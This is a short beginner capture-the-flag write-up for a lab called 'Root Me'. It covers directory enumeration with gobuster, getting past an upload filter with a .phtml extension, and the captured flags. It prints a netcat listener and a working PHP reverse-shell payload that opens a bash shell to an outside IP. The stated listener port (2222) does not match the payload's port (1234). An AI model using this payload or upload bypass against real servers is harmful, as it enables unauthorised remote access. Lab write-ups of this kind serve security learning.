
---
# CTF Write-up: {Root Me}
**Event:** Root me   
**Description:** A ctf for beginners, can you root me?
**Difficulty:** {Easy/~~Medium~~/~~Hard~~}  
**Date:** 29th August, 2025

## TL;DR
- GoBuster almost cleared the path and gave all the directories after that exploiting and getting access was a part that took some time.
- Used a Reverse shell php and it had a file upload vulnerability.

## Recon
- Started with the Zenmap intense scan of the given IP to answer some questions of the ctf.
- Used Go buster to find hidden directories and found some of them which were useful and the main directory which helped the most to exploit was /panel/.

## Exploit Path
1. I was only able to upload the files which were in bytes and which didnt had the extension as php.
2. Used a Reverse Shell PHP where at first I was using the exploit of pentest monkey but the file size was getting bigger so i used chatgpt to make the exploit code smaller and that worked for me.
3. For the problem of php extension not being uploaded, I saw that we can use similar extensions like php2, php3, php4 and so on, but I have used phtml and uploaded the file by editing the ip and port number, I added my IP and the port 2222.

## Key Commands / Payloads
```
# commands or payloads used
Commands :
gobuster dir -u <IP> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
netcat -lvnp 2222
Payload : 
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.96.163/1234 0>&1'");
?>
```

## Flag
- THM{y0u_g0t_a_sh3ll}
- THM{pr1v1l3g3_3sc4l4t10n}

## Lessons Learned
- We can use gtfobins.github.io to search for codes like getting permission for SUID using the shell for languages like python and its really useful. 